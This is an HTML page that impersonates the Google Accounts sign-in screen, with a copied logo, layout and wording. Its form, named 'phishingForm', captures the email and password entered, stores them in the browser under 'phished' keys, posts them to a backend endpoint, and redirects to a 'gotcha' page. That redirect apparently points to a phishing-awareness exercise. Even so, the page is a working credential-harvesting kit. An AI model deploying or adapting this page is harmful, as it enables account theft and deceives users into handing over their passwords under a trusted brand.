<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .google-input:focus-within label {
            color: #1a73e8;
            transform: scale(.8) translateY(-10px) translateX(-10%);
            background: white;
            padding: 0 4px;
        }
        .google-input input:not(:placeholder-shown) + label {
            transform: scale(.8) translateY(-10px) translateX(-10%);
            background: white;
            padding: 0 4px;
        }
    </style>
</head>
<body class="bg-white md:bg-gray-100 flex items-center justify-center min-h-screen font-sans">
    
    <div class="bg-white md:border md:border-gray-200 md:rounded-lg p-8 md:p-10 md:shadow-sm w-full max-w-[450px]">
        <div class="flex justify-center mb-4">
            <!-- Google Logo SVG -->
            <svg viewBox="0 0 74 24" width="74" height="24" xmlns="http://www.w3.org/2000/svg">
                <path d="M17.6 11.4c0-.8-.1-1.5-.2-2.2H9v4.2h4.8c-.2 1.4-.9 2.5-2 3.2v2.7h3.3c1.9-1.8 3-4.4 3-5.9z" fill="#4285F4"/>
                <path d="M9 20c2.4 0 4.5-.8 5.9-2.2l-3.3-2.7c-.8.5-1.8.8-2.7.8-2.1 0-3.9-1.4-4.5-3.3H1v2.7C2.5 18.3 5.5 20 9 20z" fill="#34A853"/>
                <path d="M4.5 12.6c-.1-.5-.2-1-.2-1.6s.1-1.1.2-1.6V6.7H1C.4 7.9 0 9.4 0 11s.4 3.1 1 4.3l3.5-2.7z" fill="#FBBC05"/>
                <path d="M9 4.3c1.3 0 2.5.5 3.4 1.3l2.6-2.5C13.5 1.2 11.4 0 9 0 5.5 0 2.5 1.7 1 4.7l3.5 2.7c.6-1.9 2.4-3.1 4.5-3.1z" fill="#EA4335"/>
            </svg>
        </div>
        <h1 class="text-2xl text-center text-gray-900 mb-2 font-normal">Sign in</h1>
        <p class="text-center text-gray-600 mb-8 font-medium">Use your Google Account</p>

        <form id="phishingForm" class="flex flex-col gap-6">
            
            <!-- Email Input -->
            <div class="relative google-input border border-gray-300 rounded focus-within:border-blue-500 focus-within:ring-1 focus-within:ring-blue-500">
                <input type="email" id="email" name="email" required class="w-full px-3 pt-5 pb-2 text-base text-gray-900 bg-transparent outline-none" placeholder=" ">
                <label for="email" class="absolute left-3 top-3 text-gray-500 text-base transition-all duration-200 pointer-events-none">Email or phone</label>
            </div>

            <!-- Password Input -->
            <div class="relative google-input border border-gray-300 rounded focus-within:border-blue-500 focus-within:ring-1 focus-within:ring-blue-500">
                <input type="password" id="password" name="password" required class="w-full px-3 pt-5 pb-2 text-base text-gray-900 bg-transparent outline-none" placeholder=" ">
                <label for="password" class="absolute left-3 top-3 text-gray-500 text-base transition-all duration-200 pointer-events-none">Enter your password</label>
            </div>

            <div class="text-sm font-medium text-blue-600 hover:text-blue-700 cursor-pointer mb-4">
                Forgot email?
            </div>

            <p class="text-sm text-gray-600 mb-6">
                Not your computer? Use Guest mode to sign in privately.
                <br>
                <span class="text-blue-600 font-medium cursor-pointer hover:underline">Learn more</span>
            </p>

            <div class="flex justify-between items-center mt-2">
                <button type="button" class="text-blue-600 font-medium hover:bg-blue-50 py-2 px-3 rounded transition-colors text-sm">
                    Create account
                </button>
                <button type="submit" class="bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-6 rounded transition-colors text-sm">
                    Next
                </button>
            </div>
        </form>
    </div>

    <script>
        document.getElementById('phishingForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Save to localStorage for the gotcha page
            localStorage.setItem('phished_email', email);
            localStorage.setItem('phished_password', password);

            // Prepare form data for FastAPI backend
            const formData = new FormData();
            formData.append('username', email);
            formData.append('password', password);

            try {
                // Post to the backend (fire and forget)
                await fetch('/api/auth/premium', {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error("Intercept error", error);
            } finally {
                // Instantly redirect to the Gotcha page
                window.location.href = '/static/gotcha.html';
            }
        });
    </script>
</body>
</html>
